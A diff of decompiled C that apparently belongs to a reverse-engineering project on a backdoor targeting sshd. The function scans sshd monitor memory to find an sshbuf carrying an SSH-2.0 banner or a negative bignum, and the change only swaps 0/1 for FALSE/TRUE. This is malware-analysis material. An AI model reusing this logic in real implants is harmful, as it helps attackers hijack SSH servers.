@@ -28,13 +28,13 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
   uint uVar9;
   
   if (sshbuf == (sshbuf *)0x0) {
-    return 0;
+    return FALSE;
   }
   if (((ctx != (global_context_t *)0x0) && (ctx->struct_monitor_ptr_address != (monitor **)0x0)) &&
-     (BVar5 = is_range_mapped((u8 *)ctx->struct_monitor_ptr_address,8,ctx), BVar5 != 0)) {
+     (BVar5 = is_range_mapped((u8 *)ctx->struct_monitor_ptr_address,8,ctx), BVar5 != FALSE)) {
     addr = *ctx->struct_monitor_ptr_address;
     BVar5 = is_range_mapped((u8 *)addr,0x20,ctx);
-    if (BVar5 != 0) {
+    if (BVar5 != FALSE) {
       cVar2 = *(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 1);
       addr_00 = addr->m_pkex;
       if (-1 < cVar2) {
@@ -52,7 +52,7 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
         }
       }
       BVar5 = is_range_mapped((u8 *)addr_00,8,ctx);
-      if ((BVar5 != 0) && (BVar5 = is_range_mapped((u8 *)*addr_00,0x400,ctx), BVar5 != 0)) {
+      if ((BVar5 != FALSE) && (BVar5 = is_range_mapped((u8 *)*addr_00,0x400,ctx), BVar5 != FALSE)) {
         cVar2 = *(char *)&(ctx->sshd_offsets).field0_0x0;
         addr_01 = *addr_00;
         if (cVar2 < '\0') {
@@ -60,9 +60,9 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
           pkVar1 = addr_01 + 0x400;
           for (; addr_01 < pkVar1; addr_01 = addr_01 + 8) {
             BVar5 = is_range_mapped((u8 *)addr_01,length,ctx);
-            if ((BVar5 != 0) &&
-               (BVar5 = sshbuf_extract(*(sshbuf **)addr_01,ctx,&sshbuf->d,&sshbuf->size), BVar5 != 0
-               )) {
+            if ((BVar5 != FALSE) &&
+               (BVar5 = sshbuf_extract(*(sshbuf **)addr_01,ctx,&sshbuf->d,&sshbuf->size),
+               BVar5 != FALSE)) {
               if (uVar9 < 2) {
                 EVar6 = get_string_id((char *)sshbuf->d,(char *)(sshbuf->d + 7));
                 if ((EVar6 == STR_SSH_2_0) || (EVar6 == STR_ssh_2_0)) {
@@ -71,8 +71,8 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
               }
               else {
                 BVar5 = sshbuf_bignum_is_negative(sshbuf);
-                if (BVar5 != 0) {
-                  return 1;
+                if (BVar5 != FALSE) {
+                  return TRUE;
                 }
               }
             }
@@ -81,14 +81,14 @@ BOOL sshd_get_sshbuf(sshbuf *sshbuf,global_context_t *ctx)
         else {
           BVar5 = sshbuf_extract(*(sshbuf **)(addr_01 + ((int)cVar2 << 3)),ctx,&sshbuf->d,
                                  &sshbuf->size);
-          if (BVar5 != 0) {
+          if (BVar5 != FALSE) {
             BVar5 = sshbuf_bignum_is_negative(sshbuf);
-            return (uint)(BVar5 != 0);
+            return (uint)(BVar5 != FALSE);
           }
         }
       }
     }
   }
-  return 0;
+  return FALSE;
 }
 
